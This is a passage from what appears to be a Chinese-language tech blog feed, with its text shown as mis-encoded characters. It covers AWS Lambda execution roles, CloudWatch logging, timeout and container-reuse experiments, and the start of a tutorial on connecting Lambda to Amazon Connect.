(</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;context&quot;</span><br><span class="line">        &quot;github.com/aws/aws-lambda-go/lambda&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type MyEvent struct &#123;</span><br><span class="line">        Name string `json:&quot;name&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func HandleRequest(ctx context.Context, name MyEvent) (string, error) &#123;</span><br><span class="line">        return fmt.Sprintf(&quot;Hello %s!&quot;, name.Name ), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        lambda.Start(HandleRequest)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è«¸å¦‚æ­¤é¡ã€‚</p><p>å¦å¤–ï¼Œç”±æ–¼å‰›å‰µå»º Lambda çš„æ™‚å€™åƒ…æœƒæœ‰ Lambder-Handlerä¸€å€‹æª”æ¡ˆï¼Œä½†å…¶å¯¦å¯ä»¥å­˜å–åœ¨ Lambda åŸ·è¡Œç’°å¢ƒç•¶ä¸­çš„ <code>/tmp</code> ç›®éŒ„ ï¼Œæ¯å€‹åŸ·è¡Œç’°å¢ƒéƒ½æœƒåœ¨ <code>/tmp</code> ç›®éŒ„ä¸­æä¾› 512 MB åˆ° 10,240 MB çš„ç£ç¢Ÿç©ºé–“ï¼Œå¢é‡ç‚º 1 MB [5]ã€‚å…·é«”è€Œè¨€å¯ä»¥ç­‰ä¹‹å¾Œè«‡åˆ° Lambda åŸ·è¡Œç’°å¢ƒçš„ç”Ÿå‘½é€±æœŸå†èªªã€‚</p><h2 id="æ¬Šé™"><a href="#æ¬Šé™" class="headerlink" title="æ¬Šé™"></a>æ¬Šé™</h2><p>Lambda ç•¶ä¸­ä¸»è¦æ˜¯é€éåŸ·è¡Œè§’è‰²ï¼ˆExecution Roleï¼‰ä¾†å»ä»£æ›¿ä¾†æºæœå‹™å»åŸ·è¡Œæ“ä½œã€‚</p><p>é‚£ä»€éº¼æ˜¯ Lambda åŸ·è¡Œè§’è‰²ï¼Ÿ</p><blockquote><p>Lambda å‡½æ•¸çš„åŸ·è¡Œè§’è‰²æ˜¯ AWS IAM è§’è‰²ï¼Œå®ƒå¯æˆäºˆå‡½æ•¸å­˜å– AWS æœå‹™å’Œè³‡æºçš„è¨±å¯ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥å»ºç«‹ä¸€å€‹åŸ·è¡Œè§’è‰²ï¼Œè©²è§’è‰²æœ‰æ¬Šå‘ Amazon CloudWatch å‚³é€æ—¥èªŒä¸¦å‘ AWS X-Ray ä¸Šå‚³è¿½è¹¤è³‡æ–™ã€‚æœ¬é æä¾›æœ‰é—œå¦‚ä½•å»ºç«‹ã€æª¢è¦–å’Œç®¡ç† Lambda å‡½æ•¸åŸ·è¡Œè§’è‰²çš„è³‡è¨Š [6]ã€‚</p></blockquote><p>åŸ·è¡Œè§’è‰²è·Ÿä¸€èˆ¬è§’è‰²æœ€å¤§çš„ä¸åŒå°±æ˜¯ï¼Œç•¶èª¿ç”¨å‡½æ•¸æ™‚ï¼Œ<strong>Lambda æœƒé€éæ“”ä»»æ­¤è§’è‰²è‡ªå‹•ç‚ºæ‚¨çš„å‡½æ•¸æä¾›è‡¨æ™‚æ†‘è­‰</strong>ã€‚é–‹ç™¼è€…ä¸å¿…åœ¨å‡½æ•¸ç¨‹å¼ç¢¼ä¸­å‘¼å« <code>sts:AssumeRole</code></p><p>è€Œéœ€è¦åšåˆ°é€™é»çš„å¿…è¦è¨­ç½®ï¼Œå°±æ˜¯è¦è¨­å®šè§’è‰²çš„ä¿¡ä»»æ”¿ç­–(Trust Policy)ï¼Œé€™ç•¶ä¸­å°±å¿…é ˆå°‡ Lambda æœå‹™æŒ‡å®šç‚ºå—ä¿¡ä»»çš„ä¸»é«”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Principal&quot;: &#123;</span><br><span class="line">        &quot;Service&quot;: &quot;lambda.amazonaws.com&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;Action&quot;: &quot;sts:AssumeRole&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦æœ‰äº†åŸ·è¡Œè§’è‰²ï¼Œå°±å¯ä»¥å»ç‚ºé€™å€‹è§’è‰²é™„åŠ æ”¿ç­–ï¼Œå¯ä»¥ä½¿ç”¨ AWS ç®¡ç†çš„æ”¿ç­–æˆ–è€…æ˜¯è‡ªå·±å®šç¾©æ”¿ç­–</p><p><img src="https://hackmd.io/_uploads/ryyPLT9Rn.png"></p><p>ç•¶ç„¶ï¼Œè‹¥ä½ åœ¨å»ºç«‹ Lambda çš„æ™‚å€™é¸æ“‡ â€œCreate a new role with basic Lambda permissionsâ€ï¼Œå°±æœƒå»å»ºç«‹ä¸€å€‹å¸¶æœ‰ <code>LambdaBasicExecutionRole</code> çš„æ”¿ç­–ã€‚</p><p><img src="https://hackmd.io/_uploads/HkTcIpcCh.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™å€‹æ”¿ç­–åŸºæœ¬ä¸Šå°±æ˜¯çµ¦äºˆ Lambda å‡½æ•¸èƒ½å¤ å»ºç«‹Log Group ä¸¦ä¸”èƒ½å¤ åœ¨Log Group ä¸­å»ºç«‹ Log Stream ç„¶å¾Œå¯«å…¥æ—¥èªŒçš„åŠŸèƒ½ã€‚</p><p>ç•¶èª¿ç”¨ Lambdaçš„æ™‚å€™ï¼Œæœƒåœ¨ CloudWatch å»ºç«‹åŒ…å« Lambda åç¨±çš„Log Groupï¼Œå‡è¨­ä»Šå¤©æˆ‘çš„ Lambda åç¨±å«åš <strong>TestInvocations</strong> é‚£æ—¥èªŒçµ„çš„åç¨±å°±æœƒæ˜¯ <code>/aws/lambda/TestInvocations</code></p><p><img src="https://hackmd.io/_uploads/HyaWdT50h.png"></p><p>è€Œåº•ä¸‹å°±æœƒæœ‰å°æ‡‰çš„ Log Stream</p><p><img src="https://hackmd.io/_uploads/ryBDOaqRh.png"></p><p>é€™è£¡æœ‰å€‹æœ‰æ„æ€çš„åœ°æ–¹ï¼Œå°±æ˜¯æ¯æ¬¡å¦‚æœå°å‡½æ•¸é€²è¡Œæ›´å‹•æˆ–æ˜¯åšä¸€äº›è¨­å®šä¸Šçš„èª¿æ•´(Ex. æ”¹è®Š Timeout æ™‚é–“) ä¸‹ä¸€æ¬¡èª¿ç”¨å°±æœƒç”¢ç”Ÿæ–°çš„ Log Streamã€‚</p><p>å› ç‚ºæ¯ç•¶ä½ åšä¸€æ¬¡æ–°çš„è¨­ç½®ï¼Œå°±æœƒéœ€è¦å°‡ä½ çš„è¨­å®šå¥—ç”¨åˆ°æ–°çš„Sanbox ç’°å¢ƒï¼Œä¹Ÿå°±æœƒé‡æ–°åˆå§‹åŒ–æ–°çš„ä¸€å€‹ Lambda åŸ·è¡Œç’°å¢ƒã€‚</p><p>å¦‚æœé»é–‹ Log Streamï¼Œæœƒç™¼ç¾æ¯ä¸€æ¬¡ Invocation  éƒ½æœƒä¼´éš¨è‘—ä¸åŒçš„ Messageï¼Œåˆ†åˆ¥æ˜¯ï¼š</p><ul><li>START</li><li>(Print Output, if there are any)</li><li>END</li><li>REPORT</li></ul><p>Start åˆ° End é€™æ®µæœŸé–“ä»£è¡¨ Lambda æ­£åœ¨åŸ·è¡Œï¼Œé€™æ®µæ™‚é–“çš„ TimeStamp å·®å€¼ä¹Ÿå—é™æ–¼ä½ åœ¨ Lambda ä¸Šé¢çš„ Timeout è¨­å®šï¼Œå¯ä»¥å…ˆé‡å°é€™é»ä¾†åšå€‹å°å¯¦é©—ã€‚</p><p><img src="https://hackmd.io/_uploads/S1KPKa502.png"></p><h3 id="å¯¦é©—ä¸€-Lambda-Timeout"><a href="#å¯¦é©—ä¸€-Lambda-Timeout" class="headerlink" title="å¯¦é©—ä¸€: Lambda Timeout"></a>å¯¦é©—ä¸€: Lambda Timeout</h3><p>å»ºç«‹ Lambda å‡½æ•¸åç‚º <code>TestInvocation</code>, Runtimes é€™è£¡é¸æ“‡ <code>Python3.11</code>, æ¬Šé™å°±ç¶­æŒé è¨­ã€‚ä¹‹å¾Œåˆ° Lambda ä¸»æ§å°åº•ä¸‹çš„ <strong>Code</strong> å€åŸŸç·¨è¼¯ç¨‹å¼ã€‚</p><p><img src="https://hackmd.io/_uploads/SyEhzRqAh.png"></p><p>å»ºç«‹å¥½ Lambda å¾Œæœƒçµ¦å€‹ç©ºçš„ Lambda Handlerï¼Œæˆ‘å€‘åœ¨é€™è£¡å¤š import time ä¸¦ä¸”åœ¨ handler è£é¢å»¶é² 3ç§’ã€‚æ¥è‘—æŒ‰ä¸‹ Testï¼Œé€™ç•¶ä¸­æœƒæœ‰æ¸¬è©¦ç”¨çš„ JSON eventï¼Œå¯ä»¥ç›´æ¥ç”¨ä¾†æ¸¬è©¦ã€‚</p><p>æ¸¬è©¦å®Œç•¢å¾Œå¯ä»¥å» Monitor é é¢é»é¸ â€œView CloudWatch logsâ€</p><p><img src="https://hackmd.io/_uploads/S1KUXRcRh.png"></p><p>å°±æœƒè·³å»CloudWatch ç•¶ä¸­å°æ‡‰çš„ Log Groupï¼Œé»é¸TimeStampæœ€æ–°çš„ Log Streamï¼Œè§€å¯Ÿå¯¦é©—çµæœã€‚</p><p><img src="https://hackmd.io/_uploads/SyeGfA90h.png"></p><p>å¯ä»¥ç™¼ç¾åœ¨ Start ä»¥åŠ End ä¸­é–“é–“éš” 3 ç§’ï¼Œä¸¦ä¸”æœ‰å°å‡º â€œsleep for 3 secondsâ€ã€‚</p><p>çœ¼å°–çš„äººå¯ä»¥çœ‹åˆ°å…¶ä¸­ä¸€å€‹ log entryå¾Œé¢æœ‰é¡¯ç¤º â€œTask timed out after 3 secondsâ€ã€‚é€™æ˜¯å› ç‚ºå‰›å»ºç«‹çš„ Lambda å‡½æ•¸ï¼Œé»˜èªåŸ·è¡Œæ™‚é–“çš„timeoutå€¼æœƒæ˜¯3ç§’ã€‚é€™å€‹å¯ä»¥å» Lambda ä¸»æ§å°ä¸Šçš„ â€œConfigurationâ€ ä¸Šé¢ä¿®æ”¹ã€‚<br><img src="https://hackmd.io/_uploads/ry5BERqC3.png"></p><p>Timeoutå€¼çš„æœ€ä¸Šé™æœƒæ˜¯ 15åˆ†é˜ã€‚æ‰€ä»¥æˆ‘å€‘é–‹å€‹ 15 åˆ†é˜çœ‹çœ‹ï¼Œä¸¦ä¸”å°‡ handler ç•¶ä¸­çš„ delay ä¹Ÿèª¿æˆå¤§æ¦‚ 14 åˆ†é˜å·¦å³æ¸¬è©¦çœ‹çœ‹ã€‚</p><blockquote><p>é€™æ˜¯å€‹ç¡¬é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯èªªä½ æ²’è¾¦æ³•é–‹ Support Case å»æé«˜é¡åº¦ [8]</p></blockquote><p>ç­‰å¾… 14åˆ†é˜éå»å¾Œï¼Œå¯ä»¥å¾æ—¥èªŒä¸Šçœ‹åˆ°ç¢ºå¯¦åŸ·è¡Œäº† 14åˆ†é˜<br><img src="https://hackmd.io/_uploads/H1BAq05Rn.png"></p><p>å¦å¤–åœ¨å…ˆå‰çš„æ—¥èªŒæˆªåœ–ä¸­ï¼Œæ²’æåˆ°çš„æ˜¯ INIT_STARTï¼Œé€™æ˜¯æ¯æ¬¡åˆå§‹åŒ–ä¸€å€‹åŸ·è¡Œç’°å¢ƒå¾Œå°±æœƒæœ‰çš„åˆå§‹åŒ–éšæ®µï¼Œåˆå§‹åŒ–éšæ®µåŒ…å«äº† Extension Initã€Runtime Initã€Function Init [7]</p><p><img src="https://hackmd.io/_uploads/SkQK36qC3.png"><br><em>å¼•ç”¨AWS å®˜æ–¹çš„åœ–ç‰‡</em></p><p>å‰å…©å€‹ Init éšæ®µåå‘å»ºç«‹åŸ·è¡Œç’°å¢ƒï¼Œä»¥åŠå•Ÿå‹• Runtimes é‚„æœ‰ä¸‹è¼‰deployment package åˆ°åŸ·è¡Œç’°å¢ƒç­‰ç­‰ï¼Œä½†åˆ°äº† Function init éšæ®µã€‚é€™æ™‚å€™é‚„æœƒåšä¸€ä»¶äº‹æƒ…ï¼Œé‚£å°±æ˜¯æœƒ<strong>å»åŸ·è¡Œ Lambda Handler ä»¥å¤–çš„ç¨‹å¼</strong>ã€‚</p><p><img src="https://hackmd.io/_uploads/ryzXbC9Rn.png"></p><p>é€™è£¡åœ¨ handler ä¹‹å¤–</p><p><img src="https://hackmd.io/_uploads/BJm-Z0qCn.png"></p><p>é€™éº¼èªªæœ‰é»æ¨¡ç³Šã€‚å‡è¨­ä½ å®£å‘Šäº†ä¸€å€‹å…¨åŸŸè®Šæ•¸åœ¨ Handler ä¹‹å¤–ï¼Œæˆ–è€…æ˜¯ä½ åœ¨ Lambda Handlerå¤–å»èˆ‡DBåˆå§‹åŒ–ä¸€å€‹é€£ç·šã€‚é€™äº›éƒ½å¾ˆé©åˆæ”¾åœ¨ Handler ä¹‹å¤–åšï¼Œä¸¦ä¸”æœƒåœ¨ <strong>Init-Start</strong> åˆ° <strong>Start</strong> é€™æ®µæœŸé–“åŸ·è¡Œï¼Œä¸¦ä¸”åªè¦æ˜¯æŒçºŒä½¿ç”¨ç›¸åŒçš„åŸ·è¡Œç’°å¢ƒï¼Œé‚£ Function Init ç•¶ä¸­åšçš„äº‹ä¹Ÿåƒ…æœƒåšä¸€æ¬¡ï¼Œé€™è£¡å°±æœƒå¾…åˆ° Lambda çš„ä¸€å€‹ç‰¹æ€§ï¼Œå«åš Container Reuseã€‚  </p><h3 id="å¯¦é©—äºŒ-Lambda-ç‰¹æ€§-å®¹å™¨é‡ç”¨ï¼ˆContainer-Reuseï¼‰"><a href="#å¯¦é©—äºŒ-Lambda-ç‰¹æ€§-å®¹å™¨é‡ç”¨ï¼ˆContainer-Reuseï¼‰" class="headerlink" title="å¯¦é©—äºŒ: Lambda ç‰¹æ€§ - å®¹å™¨é‡ç”¨ï¼ˆContainer Reuseï¼‰"></a>å¯¦é©—äºŒ: Lambda ç‰¹æ€§ - å®¹å™¨é‡ç”¨ï¼ˆContainer Reuseï¼‰</h3><p>å…¶å¯¦æ‰€æœ‰çš„å®¹å™¨é‡ç”¨çš„ç‰¹æ€§å¿…é ˆå…ˆæåˆ°ï¼Œ Lambda åŸ·è¡Œç’°å¢ƒæœƒæ˜¯å®¹å™¨ï¼Œä½†ä¸€èˆ¬åƒæ˜¯ docker çš„å®¹å™¨ç’°å¢ƒå°±æ˜¯åŸ·è¡Œå®Œç•¢å°±æœƒæŠŠå®¹å™¨ç æ‰ï¼Œä½†åœ¨ Lambda çš„ä½¿ç”¨å ´æ™¯ä¾†çœ‹å°±ä¸é©åˆæ¯æ¬¡åŸ·è¡Œå®Œç•¢å°±å°‡åŸ·è¡Œç’°å¢ƒé—œé–‰ï¼Œè€Œæ˜¯ç¹¼çºŒç­‰å¾…ä¸‹ä¸€å€‹èª¿ç”¨è«‹æ±‚ã€‚</p><p>å¾æ—¥èªŒä¸Šä¹Ÿå¯ä»¥è§€å¯Ÿåˆ°é€™å€‹ç‰¹æ€§ã€‚å¦‚æœä½ åœ¨ Lambda é é¢ä¸Šé€£çºŒ invoke ä¸‰æ¬¡ï¼Œä¹‹å¾Œä½ å¯ä»¥åœ¨æ—¥èªŒä¸­è§€å¯Ÿåˆ°å¾ŒçºŒçš„èª¿ç”¨è«‹æ±‚ï¼Œéƒ½æœƒå‡ºç¾åœ¨åŒä¸€å€‹ Log Stream ç•¶ä¸­ï¼Œæœƒæ¥çºŒåœ¨å‰ä¸€æ¬¡èª¿ç”¨æ—¥èªŒçš„å¾Œé¢ã€‚</p><p><img src="https://hackmd.io/_uploads/rkJu6Aq02.png"></p><p>ä¹Ÿå°±æ˜¯èªªï¼Œå°æ–¼åŒä¸€å€‹ Lambda åŸ·è¡Œç’°å¢ƒï¼ŒLambda å®Œæˆä¸€æ¬¡åŸ·è¡Œå¾Œå°±æ¥çºŒè™•ç†ä¸‹ä¸€å€‹è«‹æ±‚ï¼Œä¹Ÿå°±æ˜¯åŒä¸€å€‹ Lambda çš„æ²™ç®±ç’°å¢ƒå¯ä»¥é‡æ–°ä½¿ç”¨ã€‚</p><p>å¦‚æœå°æ–¼ Lambda Container Reuse æœ‰èˆˆè¶£çš„äººå¯ä»¥çœ‹ä¸€ä¸‹é€™ç¯‡å®˜æ–¹çš„Blog</p><blockquote><p>Understanding Container Reuse in AWS Lambda<br><a href="https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/">https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/</a></p></blockquote><p>é€™è£¡åˆæœ‰ä¸€ä»¶æœ‰æ„æ€çš„äº‹ï¼Œå¦‚æœä½ æ˜¯ç”¨ Lambda ä¸»æ§å°çš„æ¸¬è©¦æŒ‰éˆ•å»èª¿ç”¨ï¼Œä»–æœƒç­‰å¾…åŸ·è¡Œå®Œç•¢å¾Œï¼Œæ‰èƒ½å¤ è®“ä½ å†æ¬¡æŒ‰ä¸‹æ¸¬è©¦æŒ‰éˆ•ã€‚</p><p>å¦‚æœæˆ‘å€‘ç”¨ AWS CLI å»èª¿ç”¨ Lambda å‡½æ•¸ï¼Œç”¨ Terminal ä¸€æ¬¡é–‹ä¸‰å€‹TabåŒæ™‚èª¿ç”¨æˆ‘å€‘çš„ Lambda å‡½æ•¸æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ</p><h2 id="å…¶ä»–é—œéµæ¦‚å¿µ"><a href="#å…¶ä»–é—œéµæ¦‚å¿µ" class="headerlink" title="å…¶ä»–é—œéµæ¦‚å¿µ"></a>å…¶ä»–é—œéµæ¦‚å¿µ</h2><ul><li>Lambda åŸ·è¡Œç’°å¢ƒ</li><li>Cold Start</li><li>Lambda éƒ¨ç½²å¥—ä»¶</li><li>Lambda åŒæ­¥èª¿ç”¨&#x2F;éåŒæ­¥èª¿ç”¨</li><li>Lambda çš„è¯ç¶²åŠŸèƒ½</li></ul><h2 id="åƒè€ƒæ–‡ç»"><a href="#åƒè€ƒæ–‡ç»" class="headerlink" title="åƒè€ƒæ–‡ç»"></a>åƒè€ƒæ–‡ç»</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html</a><br>[3] <a href="https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/">https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html</a><br>[5] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html</a><br>[6] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html</a><br>[7] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle</a><br>[8] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¶ä½ å¾é›¶é–‹å§‹æ•´åˆ Lambda Function åˆ° Amazon Connect</title>
      <link href="/posts/5db1b7e9.html"/>
      <url>/posts/5db1b7e9.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ç¾ä»£çš„å•†æ¥­ç’°å¢ƒä¸­ï¼Œæä¾›å„ªè³ªä¸”é«˜æ•ˆçš„å®¢æˆ¶æœå‹™æ˜¯æˆåŠŸçš„é—œéµä¹‹ä¸€ã€‚<strong>Amazon Connect</strong> æ˜¯ä¸€å€‹å¼·å¤§çš„é›²ç«¯å®¢æˆ¶æœå‹™ä¸­å¿ƒï¼Œå®ƒå¯ä»¥å¹«åŠ©ä¼æ¥­è¼•é¬†å»ºç«‹é«˜åº¦å¯é çš„è¯çµ¡ä¸­å¿ƒï¼Œä¸¦èˆ‡å®¢æˆ¶é€²è¡Œç„¡ç¸«çš„äº’å‹•ã€‚æœ¬ç¯‡æŠ€è¡“éƒ¨è½æ ¼æ–‡ç« å°‡å¸¶é ˜æ‚¨é€æ­¥äº†è§£å¦‚ä½•æ•´åˆ Lambda Function åˆ° Amazon Connectï¼Œä»¥å¯¦ç¾æ›´å¤šè‡ªå®šç¾©çš„åŠŸèƒ½ã€‚</p><p>åœ¨é€™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å€‘å°‡éµå¾ªä»¥ä¸‹æ­¥é©Ÿä¾†å¯¦ç¾æ•´åˆï¼š</p><h2 id="æ­¥é©Ÿä¸€ã€å»ºç«‹-Connect-Instance"><a href="#æ­¥é©Ÿä¸€ã€å»ºç«‹-Connect-Instance" class="headerlink" title="æ­¥é©Ÿä¸€ã€å»ºç«‹ Connect Instance"></a>æ­¥é©Ÿä¸€ã€å»ºç«‹ Connect Instance</h2><p>é¦–å…ˆï¼Œæˆ‘å€‘å°‡åœ¨ Amazon Connect Console ä¸Šå»ºç«‹ä¸€å€‹ Connect Instanceã€‚</p><p>è«‹è‡³ Amazon Connect Console ä¸Šé¸æ“‡ <strong>Add Instance</strong>ã€‚é€™å€‹æ­¥é©Ÿæœƒéœ€è¦è¨­å®šä½ çš„ <strong>instance-alias</strong>ï¼Œé€™æ¨£å¯ä»¥ç‚ºä½ çš„connect instance å»ºç«‹ä¸€å€‹ uniqueçš„ Access URL</p><p><img src="https://i.imgur.com/JgeqYRX.jpg" alt="Imgur"></p><p>é€™å€‹æ­¥é©Ÿæ˜¯æ·»åŠ Adminï¼Œä½ æœƒéœ€è¦è¨­å®šä½¿ç”¨è€…åç¨±ä»¥åŠå¯†ç¢¼ã€‚</p><p><img src="https://i.imgur.com/HqRmPC9.jpg" alt="Imgur"></p><p>ä¹‹å¾Œçš„æ­¥é©Ÿæˆ‘å€‘å°±éƒ½æŒ‰ <strong>Next</strong>ï¼Œæœ€å¾Œå»ºç«‹ Instanceã€‚</p><div class="note info flat"><p>å»ºç«‹æœƒéœ€è¦ç­‰ä¸€æ®µæ™‚é–“ï¼Œå¯ä»¥è¶é€™å€‹æ™‚å€™å»ºç«‹ Lambda Funciton</p></div><h2 id="æ­¥é©ŸäºŒã€å»ºç«‹-Lambda-Function"><a href="#æ­¥é©ŸäºŒã€å»ºç«‹-Lambda-Function" class="headerlink" title="æ­¥é©ŸäºŒã€å»ºç«‹ Lambda  Function"></a>æ­¥é©ŸäºŒã€å»ºç«‹ Lambda  Function</h2><p>å‰å¾€ Lambda Consoleï¼Œé¸æ“‡å»ºç«‹ Lambda Functionï¼Œæˆ‘å€‘Lambda çš„Regionèˆ‡ Connect Instance çš„ Regionæ˜¯ä¸€æ¨£çš„ï¼Œéƒ½æ˜¯ <code>us-east-1</code></p><p><img src="https://i.imgur.com/IF7ndGN.jpg" alt="Imgur"></p><p>æˆ‘å€‘é¸æ“‡ <strong>Author from Scratch</strong>ï¼Œä¸¦ä¸”çµ¦å®šå‡½å¼åç¨±ç‚º <code>TestConnect</code>ï¼ŒRuntime é¸æ“‡ <code>Python 3.11</code><br>æ¥è‘—å…¶ä»–éƒ½ä¿æŒé è¨­è¨­å®šã€‚æœ€å¾Œå»ºç«‹ Lambda Functionã€‚</p><p>å»ºç«‹å®Œæˆå¾Œï¼Œå¯ä»¥ä¿®æ”¹ Lambda codeï¼ŒåŠ ä¸Šä¸€è¡Œåœ¨ä½ çš„ handlerä¸Šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Invoke Success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ¥è‘—æŒ‰ä¸‹ <strong>deployã€‚</strong></p><h2 id="æ­¥é©Ÿä¸‰ã€å¢åŠ Flows-åˆ°-Amazon-Connect"><a href="#æ­¥é©Ÿä¸‰ã€å¢åŠ Flows-åˆ°-Amazon-Connect" class="headerlink" title="æ­¥é©Ÿä¸‰ã€å¢åŠ Flows åˆ° Amazon Connect"></a>æ­¥é©Ÿä¸‰ã€å¢åŠ Flows åˆ° Amazon Connect</h2><blockquote><p><strong>é€™ä¸€æ­¥é©Ÿä¸­ï¼Œæˆ‘å€‘å°‡åœ¨ Connect Instance ä¸­å¢åŠ  Flowsã€‚æˆ‘å€‘å°‡ä½¿ç”¨å‰›æ‰å»ºç«‹çš„ Lambda Functionï¼Œè®“ Amazon Connect åœ¨ç‰¹å®šæƒ…æ³ä¸‹èª¿ç”¨æ­¤ Lambda å‡½å¼ã€‚</strong></p></blockquote><p>å‰å¾€å‰›æ‰å»ºç«‹çš„ Connect Instanceï¼Œé»é¸å·¦å´å°è¦½æ¬„ç•¶ä¸­çš„ <strong>Flows</strong></p><p><img src="https://i.imgur.com/evYMznQ.jpg" alt="Imgur"></p><p>å¾€ä¸‹æ‰¾åˆ° <strong>AWS Lambdaï¼Œé¸æ“‡ä½ å‰›æ‰å»ºç«‹çš„Lambdaåç¨±ï¼Œæ¥è‘—æŒ‰ä¸‹ Add Lambda Function</strong></p><p><img src="https://i.imgur.com/n7jvJGT.png?1" alt="Imgur"></p><h2 id="æ­¥é©Ÿå››ã€è¨­å®š-Contact-Flows"><a href="#æ­¥é©Ÿå››ã€è¨­å®š-Contact-Flows" class="headerlink" title="æ­¥é©Ÿå››ã€è¨­å®š Contact Flows"></a>æ­¥é©Ÿå››ã€è¨­å®š Contact Flows</h2><blockquote><p><strong>åœ¨é€™å€‹æ­¥é©Ÿä¸­ï¼Œæˆ‘å€‘å°‡è¨­å®š Contact Flowsï¼Œè®“ Amazon Connect åœ¨ç‰¹å®šæƒ…æ³ä¸‹è§¸ç™¼ Lambda å‡½å¼ä¸¦åŸ·è¡Œè‡ªå®šç¾©çš„æ“ä½œã€‚æˆ‘å€‘å°‡è¨­å®šèªéŸ³æç¤ºï¼Œä»¥åŠåœ¨ Lambda å‡½å¼è§¸ç™¼æ™‚åŸ·è¡Œçš„å‹•ä½œã€‚</strong></p></blockquote><p>é»é–‹ä½ å‰›æ‰å»ºç«‹ Connect Instance çš„ Access URL</p><p><img src="https://i.imgur.com/EgmgghI.jpg" alt="Imgur"></p><p>æœƒè·³å‡ºé¡ä¼¼é€™æ¨£çš„ç•«é¢</p><p><img src="https://i.imgur.com/OIOj9PJ.jpg" alt="Imgur"></p><p>ä¸€æ¨£å»å·¦å´çš„ Panelä¸­æ‰¾åˆ° <strong>Routing</strong>ï¼Œä¸¦é¸æ“‡ <strong>Flows</strong></p><p><img src="https://i.imgur.com/CkJosG1.jpg" alt="Imgur"></p><p>é»é–‹å¾Œé¸æ“‡ <strong>Create Flow</strong></p><p>é»é–‹å¾Œç¬¬ä¸€æ­¥å…ˆå¹«ä½ çš„ Flow è¼¸å…¥åç¨±ï¼Œé€™è£¡æˆ‘å«åš <code>TestConnect-LambdaFlow</code><br>å‰›é–‹å§‹åªæœƒå‡ºç¾ä¸€å€‹ Entry åœ¨ ç•«é¢ä¸Šï¼Œä½ 